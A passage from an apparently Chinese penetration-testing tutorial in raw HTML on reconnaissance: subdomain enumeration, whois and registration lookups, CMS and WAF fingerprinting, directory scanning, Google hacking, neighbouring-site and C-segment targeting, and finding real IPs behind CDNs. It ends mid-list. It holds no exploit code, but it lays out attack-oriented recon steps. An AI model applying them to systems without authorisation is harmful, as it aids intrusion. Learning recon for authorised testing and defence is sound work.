title=\"子域名：\"></a>子域名：</h4><p>子域名，在域名系统等级中，属于更高一层域的域。比如，mail.example.com和calendar.example.com是example.com的两个子域，而example.com则是顶级域.com的子域。凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名，三级子域名以及多级子域名。</p>\n<p>为什么要收集子域名</p>\n<p>子域名枚举可以在<strong>测试范围</strong>内发现更多的<strong>域</strong>或<strong>子域</strong>，这将<strong>增大</strong>漏洞发现的<strong>几率</strong>。</p>\n<p>有些<strong>隐藏的</strong>、<strong>被忽略</strong>的<strong>子域</strong>上运行的应用程序可能帮助我们发现<strong>重大漏洞</strong>。</p>\n<p>在同一个组织的不同域或应用程序中往往存在相同的漏洞</p>\n<p>假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其<strong>主域</strong>都是<strong>重点防护区域</strong>，所以不如<strong>先进入目标的某个子域</strong>，然后再想办法迂回接近真正的目标，这无疑是个比较好的选择。</p>\n<h5 id=\"利用在线工具查询\"><a href=\"#利用在线工具查询\" class=\"headerlink\" title=\"利用在线工具查询\"></a>利用在线工具查询</h5><p>网上有很多子域名的查询站点，可通过它们检索某个给定域名的子域名。如：</p>\n<ul>\n<li>DNSdumpster：<a href=\"https://dnsdumpster.com/\">https://dnsdumpster.com/</a><br></li>\n<li>whois反查：<a href=\"http://whois.chinaz.com/\">http://whois.chinaz.com/</a><br></li>\n<li>virustotal：<a href=\"http://www.virustotal.com/\">www.virustotal.com</a><br></li>\n<li>子域名爆破：<a href=\"https://phpinfo.me/domain/\">https://phpinfo.me/domain/</a><br></li>\n<li>IP反查绑定域名：<a href=\"http://dns.aizhan.com/\">http://dns.aizhan.com/</a><br> </li>\n<li><a href=\"https://hackertarget.com/\">https://hackertarget.com/</a><br> </li>\n<li>find-dns-host-records&#x2F;<br></li>\n<li><a href=\"https://site.ip138.com/\">https://site.ip138.com</a></li>\n</ul>\n<h5 id=\"通过证书透明度公开日志枚举子域名\"><a href=\"#通过证书透明度公开日志枚举子域名\" class=\"headerlink\" title=\"通过证书透明度公开日志枚举子域名\"></a>通过证书透明度公开日志枚举子域名</h5><p>证书透明度是证书授权机构的一个项目，证书授权机构会将每个SSL&#x2F;TLS证书发布到公共日志中。一个SSL&#x2F;TLS证书通常包含域名、子域名和邮件地址，这些也经常成为攻击者非常希望获得的有用信息。</p>\n<p>查找某个域名所属证书的最简单的方法就是使用搜索引擎来搜索一些公开的CT日志，例如以下网站：</p>\n<p>crt.sh：<a href=\"https://crt.sh/\">https://crt.sh</a><br>censys：<a href=\"https://censys.io/\">https://censys.io</a></p>\n<h5 id=\"子域名信息收集-聚合工具\"><a href=\"#子域名信息收集-聚合工具\" class=\"headerlink\" title=\"子域名信息收集-聚合工具\"></a>子域名信息收集-聚合工具</h5><p>聚合工具就是，结合和爆破，证书，搜索引擎，DNS解析记录等多个方式去探测子域名比如：oneforall</p>\n<p>OneForAll(是一款集百家之长，功能强大的全面快速子域收集终极神器)</p>\n<h6 id=\"安装工具\"><a href=\"#安装工具\" class=\"headerlink\" title=\"安装工具\"></a>安装工具</h6><p>oneforall<br>下载好OneForAll，进入到OneForAll的目录下，执行以下命令安装OneForAll所需的环境依赖</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/oneforall.png\" alt=\"oneforall\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/oneforall.png2\" alt=\"oneforall\"></p>\n<p>subDomainBrute</p>\n<p>subDomainsBrute是一款高并发的DNS暴力枚举工具</p>\n<p>下载完之后 进入目录安装依赖</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install dnspython gevent</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/submain.png\" alt=\"sub\"></p>\n<h5 id=\"kali的工具\"><a href=\"#kali的工具\" class=\"headerlink\" title=\"kali的工具\"></a>kali的工具</h5><p>在kali中的信息收集模块的DNS分析中，有很多工具可以进行域名信息收集</p>\n<ul>\n<li>Dnsenum：域名信息收集</li>\n<li>Dnsmap：收集信息和枚举DNS信息</li>\n<li>Dnsrecon：用于DNS侦察</li>\n<li>Fierce ：子域名查询</li>\n</ul>\n<h5 id=\"windows的工具\"><a href=\"#windows的工具\" class=\"headerlink\" title=\"windows的工具\"></a>windows的工具</h5><p>Windows上的子域名查询工具主要由：</p>\n<p>Layer子域名挖掘机<br>subDomainsbrute<br>K8<br>Sublist3r<br>Maltego</p>\n<h3 id=\"Whois-查询\"><a href=\"#Whois-查询\" class=\"headerlink\" title=\"Whois 查询\"></a>Whois 查询</h3><p>whois 是用来查询域名的<strong>IP</strong>以及<strong>所有者</strong>等信息的传输协议。简单说，whois就是一个用来<strong>查询域名</strong>是否已经被注册，以及<strong>注册域名</strong>的<strong>详细信息</strong>的<strong>数据库</strong>（如域名所有人、域名注册商），不同域名后缀的Whois信息需要到<strong>不同</strong>的Whois数据库查询。通过whois来实现对域名信息的查询，可以得到注册人的<strong>姓名</strong>和邮<strong>箱信息</strong>通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。</p>\n<h4 id=\"在线工具\"><a href=\"#在线工具\" class=\"headerlink\" title=\"在线工具\"></a>在线工具</h4><p><a href=\"https://whois.chinaz.com/\">https://whois.chinaz.com/</a></p>\n<p><a href=\"https://mwhois.chinaz.com/\">https://mwhois.chinaz.com/</a>  </p>\n<p><a href=\"https://whois.aizhan.com/\">https://whois.aizhan.com/</a></p>\n<p><a href=\"https://whois.aliyun.com/\">https://whois.aliyun.com/</a></p>\n<p><a href=\"https://whois.cnnic.cn/WelcomeServlet\">https://whois.cnnic.cn/WelcomeServlet</a></p>\n<h4 id=\"域名反查：\"><a href=\"#域名反查：\" class=\"headerlink\" title=\"域名反查：\"></a>域名反查：</h4><p><a href=\"https://mwhois.chinaz.com/\">https://mwhois.chinaz.com/</a></p>\n<p><a href=\"https://whois.chinaz.com/\">https://whois.chinaz.com/</a></p>\n<h4 id=\"icp备案查询：\"><a href=\"#icp备案查询：\" class=\"headerlink\" title=\"icp备案查询：\"></a>icp备案查询：</h4><p><a href=\"https://beian.mlit.gov.cn/\">https://beian.mlit.gov.cn/</a></p>\n<p><a href=\"https://icp.chinaz.com/\">https://icp.chinaz.com/</a></p>\n<p><a href=\"https://beian88.com/\">https://beian88.com/</a></p>\n<h4 id=\"在线查询\"><a href=\"#在线查询\" class=\"headerlink\" title=\"在线查询\"></a>在线查询</h4><p>如今网上出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名&#x2F;IP的whois信息由对应的管理机构保存。</p>\n<p>常见的网站包括：</p>\n<ul>\n<li><p>Whois站长之家查询：<a href=\"http://whois.chinaz.com/\">http://whois.chinaz.com/</a></p>\n</li>\n<li><p>阿里云中国万网查询：<a href=\"https://whois.aliyun.com/\">https://whois.aliyun.com/</a></p>\n</li>\n<li><p>Whois Lookup 查找目标网站所有者的信息：<a href=\"http://whois.domaintools.com/\">http://whois.domaintools.com/</a></p>\n</li>\n<li><p>Netcraft Site Report 显示目标网站上使用的技术：<a href=\"http://toolbar.netcraft.com/site_report?url=\">http://toolbar.netcraft.com/site_report?url=</a></p>\n</li>\n<li><p>Robtex DNS 查询显示关于目标网站的全面的DNS信息：<a href=\"https://www.robtex.com/\">https://www.robtex.com/</a></p>\n</li>\n<li><p>全球Whois查询：<a href=\"https://www.whois365.com/cn/\">https://www.whois365.com/cn/</a></p>\n</li>\n<li><p>站长工具爱站查询：<a href=\"https://whois.aizhan.com/\">https://whois.aizhan.com/</a></p>\n</li>\n</ul>\n<p>还可以在Kali Linux下自带的Whois查询工具，通过命令Whois查询域名信息，只需输入要查询的域名即可</p>\n<h4 id=\"备案信息查询\"><a href=\"#备案信息查询\" class=\"headerlink\" title=\"备案信息查询\"></a>备案信息查询</h4><p><strong>网站备案信息</strong>是根据<strong>国家法律法规规定</strong>，由<strong>网站所有者</strong>向国家<strong>有关部门</strong>申请的<strong>备案</strong>，是国家信息产业部对网站的一种管理途径，是为了防止在网上从事非法网站经营活动，当然主要是针对国内网站。</p>\n<p>在备案查询中我们主要关注的是：单位信息例如<strong>名称</strong>、<strong>备案编号</strong>、<strong>网站负责人</strong>、<strong>法人</strong>、<strong>电子邮箱</strong>、<strong>联系电话</strong>等。</p>\n<p>常用的备案信息查询网站有以下几个：</p>\n<p>ICP&#x2F;IP地址&#x2F;域名信息备案管理系统：<a href=\"http://beian.miit.gov.cn/publish/query/indexFirst.action\">http://beian.miit.gov.cn/publish/query/indexFirst.action</a></p>\n<p>ICP备案查询网：<a href=\"http://www.beianbeian.com/\">http://www.beianbeian.com/</a></p>\n<p>备案吧吧：<a href=\"https://www.beian88.com/\">https://www.beian88.com/</a></p>\n<p>天眼查：<a href=\"https://www.tianyancha.com/\">https://www.tianyancha.com/</a></p>\n<h2 id=\"站点信息收集\"><a href=\"#站点信息收集\" class=\"headerlink\" title=\"站点信息收集\"></a>站点信息收集</h2><p>接下来进行web网站站点信息收集，主要收集如下信息：</p>\n<ul>\n<li>CMS指纹识别</li>\n<li>历史漏洞</li>\n<li>脚本语言</li>\n<li>敏感目录&#x2F;文件</li>\n<li>Waf识别</li>\n</ul>\n<h3 id=\"CMS指纹识别\"><a href=\"#CMS指纹识别\" class=\"headerlink\" title=\"CMS指纹识别\"></a>CMS指纹识别</h3><p><strong>CMS</strong>（<strong>内容管理系统</strong>）又称为<strong>整站系统</strong>或<strong>文章系统</strong>，用于<strong>网站内容管理</strong>。用户只需要下载对应的CMS软件包，就能<strong>部署搭建</strong>，并<strong>直接利用</strong>CMS。但是各种CMS都具有其<strong>独特的结构命名规则</strong>和<strong>特定的文件内容</strong>，因此可以利用这些内容来获取<strong>CMS站点</strong>的<strong>具体软件CMS</strong>与<strong>版本</strong>。</p>\n<p>指纹识别指的是通过关键特征，识别出目标的CMS系统、服务 器、开发语言、操作系统、CDN、WAF的类别版本等等</p>\n<p>在渗透测试中，对进行指纹识别是相当有必要的，识别出相应的CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>\n<p>常见的CMS有Dedecms(织梦)、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。</p>\n<p>（1）在线识别</p>\n<p>如今，网上一些在线的网站查询CMS指纹识别，如下所示：</p>\n<ul>\n<li>云悉：<a href=\"http://www.yunsee.cn/info.html\">http://www.yunsee.cn/info.html</a></li>\n<li>BugScaner: <a href=\"http://whatweb.bugscaner.com/look/\">http://whatweb.bugscaner.com/look/</a></li>\n<li>潮汐指纹：<a href=\"http://finger.tidesec.net/\">http://finger.tidesec.net/</a></li>\n<li>云悉指纹: <a href=\"http://www.yunsee.cn/finger.html\">http://www.yunsee.cn/finger.html</a></li>\n</ul>\n<p>（2）利用工具</p>\n<p>常见的CMS指纹识别工具有<strong>WhatWeb</strong>、<strong>WebRobo</strong>、<strong>椰树</strong>、<strong>御剑Web指纹识别</strong>。大禹CMS识别程序等，可以快速识别一些主流CMS。</p>\n<p>当我们得知了一个站点的cms类型后，我们可以在网上查找与其相关的漏洞并进行相应的测试。</p>\n<p>（3）手工识别</p>\n<ol>\n<li>根据HTTP响应头判断，重点关注<strong>X-Powered-By</strong>、<strong>cookie</strong>等字段</li>\n<li>根据HTML 特征，重点关注 <strong>body</strong>、<strong>title</strong>、<strong>meta</strong>等标签的内容和属性。</li>\n<li>根据特殊的t<strong>class</strong>判断。HTML 中存在特定 class 属性的某些 <strong>div 标签</strong>，如<body class=\"ke-content\"></body></li>\n</ol>\n<h3 id=\"敏感目录-文件收集\"><a href=\"#敏感目录-文件收集\" class=\"headerlink\" title=\"敏感目录&#x2F;文件收集\"></a>敏感目录&#x2F;文件收集</h3><p>也就是对<strong>目标网站</strong>做个<strong>目录扫描</strong>。在web渗透中，探测Web目录结构和隐藏的敏感文件是一个十分重要的环节，从中可以获取网站的<strong>后台管理页面</strong>、<strong>文件上传界面</strong>、<strong>robots.txt</strong>，甚至可能扫描出<strong>备份文件</strong>从而得到网站的<strong>源代码</strong>。</p>\n<p>目录扫描可以让我们发现这个网站存在<strong>多少个目录</strong>，多少个<strong>页面</strong>，探索出网站的<strong>整体结构</strong>。通过目录扫描我们还能扫描<strong>敏感文件</strong>，<strong>后台文件</strong>，<strong>数据库文件</strong>，和<strong>信息泄漏文件</strong>等等</p>\n<h4 id=\"常见目录泄露\"><a href=\"#常见目录泄露\" class=\"headerlink\" title=\"常见目录泄露\"></a>常见目录泄露</h4><p><strong>目录遍历漏洞</strong>(程序在实现上没有<strong>充分过滤</strong>用户输入的..&#x2F;之类的<strong>目录跳转符</strong>，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。)</p>\n<p>robots.txt          允许爬虫爬取的页面</p>\n<p>sitemap.xml     指导搜索引擎搜索哪些页面 列出了网站的所有重要页面，帮助搜索引擎更好地索引网页。</p>\n<p>网站的备份文件 &#x2F; 数据</p>\n<p>后台登录的目录： &#x2F;admin， &#x2F;manage</p>\n<p>安装包（源码）列如：1.zip，非开源，商用</p>\n<p>上传的目录： 文件上传漏洞，  &#x2F;upload，&#x2F;upload.php</p>\n<p>php探针(是用来监控服务器的工具，它可以显示服务器的运行状况，如硬盘使用、内存占用、网络流量、系统负载和当前时间等信息。)： phpinfo(，用于显示 PHP 配置和系统信息)，</p>\n<p>文本编辑器： kindeditor，CKeditor ， Ueditor，文件上传漏洞、命令注入(如果没有严格的验证和清理，攻击者可能利用这些编辑器进行文件上传攻击、命令注入或跨站脚本攻击（XSS）)</p>\n<h4 id=\"常见的网站目录的扫描工具主要有：\"><a href=\"#常见的网站目录的扫描工具主要有：\" class=\"headerlink\" title=\"常见的网站目录的扫描工具主要有：\"></a>常见的网站目录的扫描工具主要有：</h4><ul>\n<li>御剑后台扫描工具</li>\n<li>dirbuster扫描工具</li>\n<li>dirsearch扫描工具</li>\n<li>dirb</li>\n<li>wwwscan</li>\n<li>Sensitivefilescan</li>\n</ul>\n<h3 id=\"Waf识别\"><a href=\"#Waf识别\" class=\"headerlink\" title=\"Waf识别\"></a>Waf识别</h3><p><strong>Web应用防护系统</strong>（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对<strong>HTTP&#x2F;HTTPS</strong>的安全策略来专门为Web应用提供保护的一款产品。</p>\n<h4 id=\"waf介绍\"><a href=\"#waf介绍\" class=\"headerlink\" title=\"waf介绍\"></a>waf介绍</h4><p>WAF分为<strong>非嵌入型WAF和嵌入型WAF</strong>，非嵌入型WAF指的是<strong>硬件型WAF</strong>、<strong>云WAF</strong>、<strong>软件型WAF</strong>之类的；而嵌入型WAF指的是网站<strong>内置的WAF</strong></p>\n<p>非嵌入型WAF对Web流量的解析完全是<strong>靠自身</strong>，而嵌入型WAF拿到的Web数据是<strong>已经被解析加工好的</strong>。所以非嵌入型的受攻击机面还涉及到其他层面，</p>\n<p>而嵌入型WAF从Web容器模块型WAF、代码层WAF往下走，其对抗畸形报文、扫操作绕过的能力越来越强。</p>\n<h4 id=\"wafoof\"><a href=\"#wafoof\" class=\"headerlink\" title=\"wafoof\"></a>wafoof</h4><p><strong>wafw00f</strong>是一个Web应用防火墙（WAF）指纹识别的工具。</p>\n<h5 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h5><p>下载完之后 进入目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python setup.py install</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"wafw00f的工作原理：\"><a href=\"#wafw00f的工作原理：\" class=\"headerlink\" title=\"wafw00f的工作原理：\"></a>wafw00f的工作原理：</h4><ol>\n<li><p>发送<strong>正常</strong>的<strong>HTTP请求</strong>，然后<strong>分析响应</strong>，这可以识别出很多WAF。</p>\n</li>\n<li><p>如果不成功，它会发送一些（可能是恶意的）HTTP请求，使用简单的<strong>逻辑推断</strong>是哪一个WAF。</p>\n</li>\n<li><p>如果这也不成功，它会分析之前返回的响应，使用<strong>其它简单的算法猜测</strong>是否有某个WAF或者安全解决方案响应了我们的攻击。</p>\n</li>\n</ol>\n<h3 id=\"敏感信息收集\"><a href=\"#敏感信息收集\" class=\"headerlink\" title=\"敏感信息收集\"></a>敏感信息收集</h3><p>有时候，针对某些安全做得很好的目标，直接通过技术层面是无法完成渗透测试的。此时，便可以利用<strong>搜索引擎搜索</strong>目标<strong>暴露在互联网上</strong>的<strong>关联信息</strong>。例如：<strong>数据库文件</strong>、<strong>SQL注入</strong>、<strong>服务配置信息</strong>，甚至是通过Git找到<strong>站点</strong>泄露源代码，以及<strong>Redis</strong>等未授权访问、<strong>Robots.txt</strong>等敏感信息，从而达到渗透目的。</p>\n<p>Google hacking</p>\n<ul>\n<li><strong>intext</strong>：寻找正文中含有关键字的网页</li>\n<li><strong>intitle</strong>：寻找标题中含有关键字的网页</li>\n<li><strong>allintitle</strong>：用法和intitle类似，只不过可以指定多个词</li>\n<li><strong>inurl</strong>：搜索url中含有关键词的网页</li>\n<li><strong>allinurl</strong>：用法和inurl类似，只不过可以指定多个词</li>\n<li><strong>site</strong>：指定访问的站点</li>\n<li><strong>filetype</strong>：指定访问的文件类型</li>\n<li><strong>link</strong>：指定链接的网页</li>\n<li><strong>related</strong>：搜索相似类型的网页</li>\n<li><strong>info</strong>：返回站点的指定信息，例如：info:<a href=\"http://www.baidu.-/\">www.baidu.-</a> com   将返回百度的一些信息</li>\n<li><strong>phonebook</strong>：电话簿查询美国街道地址和电话号码信息</li>\n<li><strong>Index of</strong>：利用 Index of 语法可以发现允许目录浏览的web网站，就像在本地的普通目录一样</li>\n</ul>\n<h3 id=\"Github信息泄露\"><a href=\"#Github信息泄露\" class=\"headerlink\" title=\"Github信息泄露\"></a>Github信息泄露</h3><p>itHub作为开源代码平台，给程序员提供了很多便利，但如果使用不当，比如将包含了账号密码、密钥等配置文件的代码上传了，导致攻击者能发现并进一步利用这些泄露的信息，就是一个典型的GitHub敏感信息泄露漏洞，再如开发人员在开发时，常常会先把源码提交到github，最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息，</p>\n<h2 id=\"旁站信息收集\"><a href=\"#旁站信息收集\" class=\"headerlink\" title=\"旁站信息收集\"></a>旁站信息收集</h2><p>旁站是与攻击目标在同一服务器上的不同网站,在攻击目标没有漏洞的情况 下,可以通过查找旁站的漏洞攻击旁站,然后再通过提权拿到服务器的最高权限,拿到服务器的最高权限后攻击目标也就拿下了</p>\n<h3 id=\"查询旁站的方式\"><a href=\"#查询旁站的方式\" class=\"headerlink\" title=\"查询旁站的方式\"></a>查询旁站的方式</h3><p>获取旁站一般有这个几个方式：</p>\n<ol>\n<li>通过站长工具进行同IP的查询</li>\n</ol>\n<p><a href=\"https://stool.chinaz.com/same\">https://stool.chinaz.com/same</a></p>\n<p><a href=\"https://chapangzhan.com/\">https://chapangzhan.com/</a></p>\n<p><a href=\"https://www.webscan.cc/\">https://www.webscan.cc/</a></p>\n<ol start=\"2\">\n<li><p>搜索引擎搜索</p>\n</li>\n<li><p>网络空间探测引擎搜索</p>\n</li>\n</ol>\n<h2 id=\"c端主机查询\"><a href=\"#c端主机查询\" class=\"headerlink\" title=\"c端主机查询\"></a>c端主机查询</h2><p>C段查询主要是当前的IP攻击不下来的时候，可以攻击他的C段，比如IP是220.181.34.34是我们的目标，但是攻击不下来，可以去扫描220.181.34.0-255这个网段，看看能不能攻击下来</p>\n<p>对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器</p>\n<h3 id=\"nmap扫描c端主机\"><a href=\"#nmap扫描c端主机\" class=\"headerlink\" title=\"nmap扫描c端主机\"></a>nmap扫描c端主机</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sn -ip/24</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"搜索引擎C段信息\"><a href=\"#搜索引擎C段信息\" class=\"headerlink\" title=\"搜索引擎C段信息\"></a>搜索引擎C段信息</h3><p>使用google或者百度进行语法搜索 site:x.x.x.*进行C段的探测</p>\n<h3 id=\"c端扫描的工具扫描\"><a href=\"#c端扫描的工具扫描\" class=\"headerlink\" title=\"c端扫描的工具扫描\"></a>c端扫描的工具扫描</h3><h3 id=\"使用网络空间探测引擎-IP-”XXX-XXX-XXX-0-24”\"><a href=\"#使用网络空间探测引擎-IP-”XXX-XXX-XXX-0-24”\" class=\"headerlink\" title=\"使用网络空间探测引擎 IP&#x3D;”XXX.XXX.XXX.0&#x2F;24”\"></a>使用网络空间探测引擎 IP&#x3D;”XXX.XXX.XXX.0&#x2F;24”</h3><h3 id=\"存活资产探测\"><a href=\"#存活资产探测\" class=\"headerlink\" title=\"存活资产探测\"></a>存活资产探测</h3><p>C段+全段口会生成很多资产，但是其中会有不能访问的，所以我们需要资产探活。</p>\n<p>用EHole工具</p>\n<h2 id=\"服务器信息收集\"><a href=\"#服务器信息收集\" class=\"headerlink\" title=\"服务器信息收集\"></a>服务器信息收集</h2><p>我们还需要对目标服务器的信息进行收集，主要包括一下部分：</p>\n<ul>\n<li>Web服务器指纹识别</li>\n<li>真实IP地址识别</li>\n<li>编程语言</li>\n<li>Web中间件</li>\n<li>端口信息收集</li>\n<li>后端存储技术识别</li>\n</ul>\n<p>Web服务器指纹识别<br>Web服务器指纹识别是了解正在运行的web服务器类型和版本，目前市场上存在几种不同的web服务器提供商和软件版本，了解被测试的web服务器的类型，能让测试者更好去测试已知漏洞和大概的利用方法，将会在渗透测试过程中有很大的帮助，甚至会改变测试的路线。</p>\n<h3 id=\"Web服务器指纹识别主要识别一下信息：\"><a href=\"#Web服务器指纹识别主要识别一下信息：\" class=\"headerlink\" title=\"Web服务器指纹识别主要识别一下信息：\"></a>Web服务器指纹识别主要识别一下信息：</h3><p>1、Web服务器<strong>名称</strong>，<strong>版本</strong></p>\n<p>2、Web服务器<strong>后端</strong>是否有<strong>应用服务器</strong></p>\n<p>3、<strong>数据库</strong>(DBMS)是否**部署在同一主机(host)**，数据库类型</p>\n<p>4、Web应用使用的<strong>编程语言</strong></p>\n<p>5、Web<strong>应用框架</strong></p>\n<h4 id=\"手工检测\"><a href=\"#手工检测\" class=\"headerlink\" title=\"手工检测\"></a>手工检测</h4><ol>\n<li><p>HTTP头分析<br>即查看HTTP响应头中的<strong>Server</strong>、<strong>X-Powered-By</strong>、<strong>Cookie</strong> 等字段，这也是最基本的方法。</p>\n</li>\n<li><ol start=\"2\">\n<li>协议行为<br>即从<strong>HTTP头字段顺序分析</strong>，观察HTTP响应头的<strong>组织顺序</strong>，因为每个服务器都有一个内部的H<strong>TTP头排序</strong>方法。</li>\n</ol>\n</li>\n<li><p>浏览并观察网站<br>我们可以观察网站某些位置的<strong>HTML源码</strong>(<strong>特殊的class名称</strong>)及其<strong>注释(comment)部分</strong>，可能暴露有价值信息。观察<strong>网站页面后缀</strong>可以判断Web应用使用的编程语言和框架。</p>\n</li>\n<li><p>刻意构造错误<br>错误页面可以给你提供关于服务器的大量信息。可以通过构造含有随机字符串的URL，并访问它来尝试得到404页面。</p>\n</li>\n</ol>\n<h4 id=\"利用工具识别\"><a href=\"#利用工具识别\" class=\"headerlink\" title=\"利用工具识别\"></a>利用工具识别</h4><p><strong>whatweb</strong>是一款用于辅助的自动化Web应用指纹分析工具</p>\n<h2 id=\"真实IP地址识别\"><a href=\"#真实IP地址识别\" class=\"headerlink\" title=\"真实IP地址识别\"></a>真实IP地址识别</h2><p>我们平时使用浏览器，使用的都是<strong>域名</strong>，域名的存在是为了方便人的记忆，其实浏览器本质还是<strong>访问真实IP地址</strong>来获取页面的。</p>\n<p>在渗透测试中，一般只会给你一个域名，那么我们就要根据这个域名来确定目标服务器的真实IP，我们可以通过像<a href=\"http://www.ip138.com这样的ip查询网直接获取目标的一些ip及域名信息,但这里的前提是目标服务器**没有使用cdn/\">www.ip138.com这样的IP查询网直接获取目标的一些IP及域名信息，但这里的前提是目标服务器**没有使用CDN</a>**</p>\n<p>找到真实的IP我们就可以访问这个IP的C段和端口，方便进一步渗透，</p>\n<h3 id=\"什么是CDN\"><a href=\"#什么是CDN\" class=\"headerlink\" title=\"什么是CDN\"></a>什么是CDN</h3><p>CDN的全称是Content Delivery Network，即<strong>内容分发网络</strong>。企业利用分布在<strong>不同区域</strong>的<strong>节点服务器群组</strong>成流量分配<strong>管理平台</strong>，为用户提供内容<strong>分散存储</strong>和<strong>高速缓存服务</strong></p>\n<h3 id=\"CDN的优势\"><a href=\"#CDN的优势\" class=\"headerlink\" title=\"CDN的优势\"></a>CDN的优势</h3><ol>\n<li><p>提高用户访问速率，优化用户使用体验</p>\n</li>\n<li><p>隐藏真实服务器的IP</p>\n</li>\n<li><p>提供WAF功能，目前很多CDN也提供了WAF的功能，我们的访问请求会先经过CDN节点的过滤，该过滤可对SQL注入、XSS、Webshell上传、命令注入、恶意扫描等攻击行为进行有效检测和拦截。CDN节点将认为无害的数据提交给真实的主机服务器。</p>\n</li>\n</ol>\n<h3 id=\"CDN几种访问方式的不同\"><a href=\"#CDN几种访问方式的不同\" class=\"headerlink\" title=\"CDN几种访问方式的不同\"></a>CDN几种访问方式的不同</h3><ol>\n<li>传统访问：用户访问域名–&gt;解析服务器IP–&gt;访问目标主机</li>\n<li>普通CDN：用户访问域名–&gt;CDN节点–&gt;真实服务器IP–&gt;访问目标主机</li>\n<li>带WAF的CDN：用户访问域名–&gt;CDN节点（云WAF）–&gt;真实服务器IP–&gt;访问目标主机</li>\n</ol>\n<p>我们也可以<strong>设置代理</strong>或者通过在线ping网站来在不同地区进行ping测试，然后对比每个地区ping出的IP结果，查看这些IP是否一致，<strong>一致</strong>，则极有可能<strong>不存在CDN</strong>。根据 CDN 的工作原理，如果网站使用了 CDN，那么从<strong>全国各地访问网站</strong>的 IP 地址是<strong>各个 CDN 节点的 IP 地址</strong>，那么如果ping出来的IP<strong>大多不太一样</strong>或者<strong>规律性很强</strong>，可以尝试查询这些IP的归属地，判断是否存在CDN。有以下网站可以进行ping测试：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://ping.chinaz.com/</span><br><span class=\"line\">https://www.wepcc.com</span><br><span class=\"line\">https://www.17ce.com</span><br></pre></td></tr></table></figure>\n\n<p>SearchMap判断目标有没有使用CDN</p>\n<p>searchmap是一款集域名解析、IP反查域名、WHOIS查询、CDN检测、端口扫描、目录扫描、子域名挖掘为一体的前渗透测试综合信息收集工具</p>\n<h3 id=\"如何绕过CDN找到目标真实IP？\"><a href=\"#如何绕过CDN找到目标真实IP？\" class=\"headerlink\" title=\"如何绕过CDN找到目标真实IP？\"></a>如何绕过CDN找到目标真实IP？</h3><ol>\n<li><p>利用子域名。一般来说很多站长可能只会对主站或者流量较大的分站使用CDN，但是一些流量比较小的分站可能没有挂CDN，这些分站和主站虽然不是同一个IP但是都在同一个C段下面的情况，所以我们可以通过ping二级域名获取分站lP，从而能判断出目标的真实IP段。</p>\n<br></li>\n<li><p>查询主域。以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不使用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了</p>\n<br></li>\n<li><p>扫描网站敏感文件，如phpinfo.php等，从而找到目标的真实IP。</p>\n<br></li>\n<li><p>从国外访问。国内很多CDN厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实P。我们可以通过国外在线代理网站访问，可能会得到真实的IP地址，</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://host-tracker.com/</span><br><span class=\"line\"></span><br><span class=\"line\">http://www.webpagetest.org/</span><br><span class=\"line\"></span><br><span class=\"line\">https://asm.ca.com/en/ping.php</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n<li><p>查看域名历史解析记录。也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 